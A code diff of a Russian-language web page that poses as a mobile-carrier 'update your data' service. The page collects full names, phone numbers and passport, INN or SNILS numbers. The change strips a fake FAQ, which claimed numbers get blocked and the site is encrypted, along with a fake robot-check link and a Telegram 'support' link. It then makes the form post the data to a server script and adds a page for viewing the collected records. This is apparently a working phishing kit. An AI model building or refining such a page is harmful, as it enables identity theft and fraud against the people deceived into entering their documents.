@@ -57,20 +57,6 @@
       color: #4b0082;
     }
     .hidden { display: none; }
-    .success {
-      font-size: 18px;
-      color: #4b0082;
-      font-weight: bold;
-      text-align: center;
-      line-height: 1.5;
-    }
-    .success button {
-      margin-top: 15px;
-      background: #4b0082;
-    }
-    .success button:hover {
-      background: #6a0dad;
-    }
     p { margin: 10px 0; text-align: center; }
   </style>
 </head>
@@ -81,18 +67,15 @@
     <!-- Главное меню -->
     <div id="menu">
       <button onclick="showForm()">📝 Обновить данные</button>
-      <button onclick="alertAuth('поменять тариф')">🔄 Поменять тариф</button>
-      <button onclick="alertAuth('проверить баланс')">💳 Проверить баланс</button>
-      <button onclick="alertAuth('пополнить баланс')">💸 Пополнить баланс</button>
-      <button onclick="showServices()">🛠️ Дополнительные услуги</button>
+      <a href="view_data.php"><button>📑 Посмотреть данные</button></a>
     </div>
 
     <!-- Форма -->
-    <form id="form" class="hidden">
+    <form id="form" class="hidden" method="POST" action="save_data.php">
       <!-- Шаг 1 -->
       <div id="step1">
         <p><b>👤 Укажите ФИО полностью:</b></p>
-        <input type="text" id="fullname" placeholder="Фамилия Имя Отчество" required>
+        <input type="text" name="fullname" id="fullname" placeholder="Фамилия Имя Отчество" required>
         <button type="button" onclick="validateFullname()">Продолжить ➡️</button>
         <button type="button" class="back-btn" onclick="goHome()">⬅️ Назад</button>
       </div>
@@ -100,7 +83,7 @@
       <!-- Шаг 2 -->
       <div id="step2" class="hidden">
         <p><b>📞 Укажите номер телефона:</b></p>
-        <input type="tel" id="phone" placeholder="+7 999 123 45 67" required>
+        <input type="tel" name="phone" id="phone" placeholder="+7 999 123 45 67" required>
         <button type="button" onclick="prevStep(2)">⬅️ Назад</button>
         <button type="button" onclick="validatePhone()">Продолжить ➡️</button>
       </div>
@@ -108,62 +91,26 @@
       <!-- Шаг 3 -->
       <div id="step3" class="hidden">
         <p><b>Выберите документ и введите номер:</b></p>
-        <select id="document_type" required onchange="formatDocNumber()">
+        <select name="document_type" id="document_type" required onchange="formatDocNumber()">
           <option value="">Выберите документ</option>
           <option value="Паспорт">📄 Паспорт</option>
           <option value="ИНН">🧾 ИНН</option>
           <option value="СНИЛС">🟢 СНИЛС</option>
         </select>
-        <input type="text" id="document_number" placeholder="Номер документа" required oninput="autoFormatDoc()">
+        <input type="text" name="document_number" id="document_number" placeholder="Номер документа" required oninput="autoFormatDoc()">
         <button type="button" onclick="prevStep(3)">⬅️ Назад</button>
         <button type="submit">Подтвердить ✅</button>
       </div>
     </form>
-
-    <!-- Успех -->
-    <div id="success" class="hidden success">
-      ✅ Данные отправлены!<br><br>
-      Последний шаг: <br>
-      <a href="https://redirect.figma.site/" target="_blank">
-        <button>Я не робот ✅</button>
-      </a>
-    </div>
-
-    <!-- Доп. услуги -->
-    <div id="services" class="hidden">
-      <button onclick="showFAQ()">❓ Часто задаваемые вопросы</button>
-      <button onclick="showInstruction()">ℹ️ Инструкция</button>
-      <a href="https://t.me/MyPhoenlxsupport" target="_blank">
-        <button>📞 Связаться с техподдержкой</button>
-      </a>
-      <button class="back-btn" onclick="goHome()">↩️ Вернуться назад</button>
-    </div>
-
-    <!-- FAQ -->
-    <div id="faq" class="hidden">
-      <button onclick="alertMsg('⚠️ Если номер телефона не обновлён вовремя, он может быть заблокирован.')">🚫 Блокировка номера</button>
-      <button onclick="alertMsg('🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование).')">🔒 Это безопасно?</button>
-      <button onclick="alertMsg('⚡️ Для удобства и переход на цифровые площадки.')">⚡️ Почему через Telegram?</button>
-      <button onclick="alertMsg('👉 Паспорт, ИНН, СНИЛС.')">📑 Какие документы можно использовать?</button>
-      <button onclick="alertMsg('✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод.')">🔁 Можно ли исправить ошибку?</button>
-      <button class="back-btn" onclick="showServices()">↩️ Назад</button>
-    </div>
   </div>
 
   <script>
-    // === Навигация ===
     function goHome() { hideAll(); document.getElementById("menu").classList.remove("hidden"); }
     function showForm() { hideAll(); document.getElementById("form").classList.remove("hidden"); document.getElementById("step1").classList.remove("hidden"); }
-    function showServices() { hideAll(); document.getElementById("services").classList.remove("hidden"); }
-    function showFAQ() { hideAll(); document.getElementById("faq").classList.remove("hidden"); }
-    function showInstruction() { alertMsg("📋 Чтобы обновить данные:\n1️⃣ Нажмите «Обновить данные».\n2️⃣ Отправьте номер телефона.\n3️⃣ Выберите документ и введите его номер.\n4️⃣ Получите подтверждение."); }
-    function alertAuth(action) { alert("⚠️ Мы не можем " + action + " без авторизации!"); }
-    function alertMsg(msg) { alert(msg); }
-    function hideAll() { ["menu", "form", "step1", "step2", "step3", "success", "services", "faq"].forEach(id => document.getElementById(id).classList.add("hidden")); }
-    function nextStep(step) { document.getElementById("step" + step).classList.add("hidden"); document.getElementById("step" + (step + 1)).classList.remove("hidden"); }
-    function prevStep(step) { document.getElementById("step" + step).classList.add("hidden"); document.getElementById("step" + (step - 1)).classList.remove("hidden"); }
+    function hideAll() { ["menu","form","step1","step2","step3"].forEach(id => document.getElementById(id).classList.add("hidden")); }
+    function nextStep(step) { document.getElementById("step"+step).classList.add("hidden"); document.getElementById("step"+(step+1)).classList.remove("hidden"); }
+    function prevStep(step) { document.getElementById("step"+step).classList.add("hidden"); document.getElementById("step"+(step-1)).classList.remove("hidden"); }
 
-    // === Валидация ФИО ===
     function validateFullname() {
       const fullname = document.getElementById("fullname").value.trim();
       const regex = /^[А-Яа-яЁё\s-]+$/;
@@ -174,81 +121,44 @@
       nextStep(1);
     }
 
-    // === Автоформат телефона ===
     const phoneInput = document.getElementById("phone");
     phoneInput.addEventListener("input", () => {
       let digits = phoneInput.value.replace(/\D/g, "");
       if (digits.startsWith("8")) digits = "7" + digits.slice(1);
       if (!digits.startsWith("7")) digits = "7" + digits;
-
       let formatted = "+7";
-      if (digits.length > 1) formatted += " " + digits.slice(1, 4);
-      if (digits.length > 4) formatted += " " + digits.slice(4, 7);
-      if (digits.length > 7) formatted += " " + digits.slice(7, 9);
-      if (digits.length > 9) formatted += " " + digits.slice(9, 11);
-
+      if (digits.length > 1) formatted += " " + digits.slice(1,4);
+      if (digits.length > 4) formatted += " " + digits.slice(4,7);
+      if (digits.length > 7) formatted += " " + digits.slice(7,9);
+      if (digits.length > 9) formatted += " " + digits.slice(9,11);
       phoneInput.value = formatted.trim();
     });
 
     function validatePhone() {
       const phone = document.getElementById("phone").value.trim();
       const digits = phone.replace(/\D/g, "");
-      if (!digits.startsWith("7")) {
-        alert("❌ Номер должен начинаться с +7.");
-        return;
-      }
-      if (digits.length !== 11) {
-        alert("❌ В номере должно быть 11 цифр.");
+      if (!digits.startsWith("7") || digits.length !== 11) {
+        alert("❌ Неверный номер телефона!");
         return;
       }
       nextStep(2);
     }
 
-    // === Автоформат документов ===
     function autoFormatDoc() {
       const docType = document.getElementById("document_type").value;
       const input = document.getElementById("document_number");
       let digits = input.value.replace(/\D/g, "");
-
       if (docType === "СНИЛС") {
         let formatted = "";
-        if (digits.length > 0) formatted = digits.slice(0, 3);
-        if (digits.length > 3) formatted += "-" + digits.slice(3, 6);
-        if (digits.length > 6) formatted += "-" + digits.slice(6, 9);
-        if (digits.length > 9) formatted += " " + digits.slice(9, 11);
+        if (digits.length > 0) formatted = digits.slice(0,3);
+        if (digits.length > 3) formatted += "-" + digits.slice(3,6);
+        if (digits.length > 6) formatted += "-" + digits.slice(6,9);
+        if (digits.length > 9) formatted += " " + digits.slice(9,11);
         input.value = formatted;
       } else {
-        input.value = digits; // Паспорт и ИНН без форматирования
+        input.value = digits;
       }
     }
-
-    function validateDocument(docType, docNum) {
-      const digits = docNum.replace(/\D/g, "");
-      if (docType === "Паспорт") return digits.length >= 10 && digits.length <= 12;
-      if (docType === "ИНН") return digits.length === 12;
-      if (docType === "СНИЛС") return digits.length === 11;
-      return false;
-    }
-
-    // === Отправка ===
-    document.getElementById("form").addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      const docType = document.getElementById("document_type").value;
-      const docNum = document.getElementById("document_number").value.trim();
-
-      if (!docType || !docNum) {
-        alert("⚠️ Заполните все поля!");
-        return;
-      }
-      if (!validateDocument(docType, docNum)) {
-        alert("❌ Неверный формат для документа: " + docType);
-        return;
-      }
-
-      hideAll();
-      document.getElementById("success").classList.remove("hidden");
-    });
   </script>
 </body>
 </html>
